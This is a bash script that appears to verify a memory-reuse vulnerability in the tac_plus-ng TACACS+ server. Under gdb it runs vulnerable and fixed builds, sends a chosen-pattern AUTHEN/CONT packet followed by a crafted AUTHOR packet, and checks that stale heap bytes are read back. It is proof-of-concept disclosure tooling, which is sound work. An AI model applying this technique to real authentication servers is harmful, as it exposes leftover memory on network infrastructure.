#!/usr/bin/env bash
# Cross-packet chosen-byte readback on plain (non-ASan) builds under gdb.
# Prime = large seq-3 AUTHEN/CONT carrying a chosen pattern; trigger = small
# AUTHOR in a new session on the same loopback connection.  Four cases:
# vulnerable prime, fixed prime, vulnerable without prime, vulnerable with an
# alternate pattern byte.  Normalized evidence hashes are printed for replay.
set -u
cd "$(dirname "$0")"
H=$(pwd)
R=$(dirname "$H")
OS=linux-6.8.0-149-generic-x86_64
V="$R/src-plain/build/$OS/tac_plus-ng/tac_plus-ng"
VL="$R/src-plain/build/$OS/mavis"
F="$R/src-fixed-plain/build/$OS/tac_plus-ng/tac_plus-ng"
FL="$R/src-fixed-plain/build/$OS/mavis"
DATA='cmd=AAAAcmd=BBBBcmd=CCCCcmd=DDDDcmd=EEEEcmd=FFFFcmd=GGGGcmd=HHHH'
FAIL=0

if [ ! -x "$V" ] || [ ! -x "$F" ]; then
    echo "plain builds missing; see PROVENANCE.md"
    exit 2
fi

norm() {
    sed -E \
      -e 's/0x[0-9a-fA-F]+/0xADDR/g' \
      -e 's/#[0-9]+ /#N /g' \
      -e "s#$R#ROOT#g" "$1"
}

run_case() {
    local name="$1" bin="$2" libdir="$3" port="$4" extra="$5"
    python3 "$H/run_gdb2.py" --bin "$bin" --libdir "$libdir" --port "$port" \
        --log "$H/reuse-$name.log" --gdbcmd "$H/gdb-reuse.cmd" \
        --client wire4.py --client-args="$extra" \
        > "$H/reuse-$name.stdout" 2>/dev/null
    echo "case=$name runner_rc=$?"
}

emit() {
    local label="$1" file="$2" pattern="$3"
    if norm "$file" | grep -qE "$pattern"; then
        echo "PASS $label"
    else
        echo "FAIL $label (pattern /$pattern/ absent)"
        FAIL=$((FAIL + 1))
    fi
}

absent() {
    local label="$1" file="$2" pattern="$3"
    if norm "$file" | grep -qE "$pattern"; then
        echo "FAIL $label (unexpected /$pattern/)"
        FAIL=$((FAIL + 1))
    else
        echo "PASS $label"
    fi
}

extract() {
    local name="$1"
    {
        echo "case=$name"
        grep -a '^trigger seq' "$H/reuse-$name.stdout" || true
        norm "$H/reuse-$name.log" | grep -E \
          '^(PRIME in|TRIG in|EVALARGS|L78 |[0-9]+ patterns found)' \
          | sed -E "s/0xADDR/0xADDR/g" | head -60
    }
}

echo "=== vulnerable pin + Z prime + crafted AUTHOR ==="
run_case vuln "$V" "$VL" 4991 ""
emit vuln_same_chunk "$H/reuse-vuln.log" 'TRIG in=0xADDR base=0xADDR inlen=104 prime_in=0xADDR'
emit vuln_prime_read "$H/reuse-vuln.log" 'L78 i=1[2-9] tlen='
emit vuln_z_in_cmdline "$H/reuse-vuln.log" "^0xADDR.*'Z' <repeats"
emit vuln_reply_18 "$H/reuse-vuln.stdout" 'reply_len=18'
same=$(grep -a '^TRIG in=' "$H/reuse-vuln.log" | awk '{a=$2;b=$5;sub(/^[^=]*=/,"",a);sub(/^[^=]*=/,"",b);print (a==b)}' | head -1)
if [ "$same" = "1" ]; then
    echo "PASS same_chunk_address"
else
    echo "FAIL same_chunk_address (trigger did not reuse prime chunk)"
    FAIL=$((FAIL + 1))
fi

echo "=== fixed pin + same prime and trigger ==="
run_case fixed "$F" "$FL" 4992 ""
absent fixed_no_eval "$H/reuse-fixed.log" '^EVALARGS '
emit fixed_reply_57 "$H/reuse-fixed.stdout" 'reply_len=57'

echo "=== vulnerable pin + trigger only (no prime) ==="
run_case noprime "$V" "$VL" 4993 "--no-prime"
nc=$(grep -ac '^L78 ' "$H/reuse-noprime.log")
if [ "$nc" = "8" ]; then
    echo "PASS noprime_no_prime_read"
else
    echo "FAIL noprime_no_prime_read (L78 count=$nc, expected 8)"
    FAIL=$((FAIL + 1))
fi
emit noprime_reply_18 "$H/reuse-noprime.stdout" 'reply_len=18'

echo "=== vulnerable pin + Y prime + crafted AUTHOR ==="
run_case alt "$V" "$VL" 4994 "--pattern-byte Y"
emit alt_y_in_cmdline "$H/reuse-alt.log" "^0xADDR.*'Y' <repeats"

echo "=== normalized evidence hashes ==="
for n in vuln fixed noprime alt; do
    printf '%s ' "$n"
    extract "$n" | sha256sum | cut -d' ' -f1
done
echo "FAILURES=$FAIL"
exit "$FAIL"
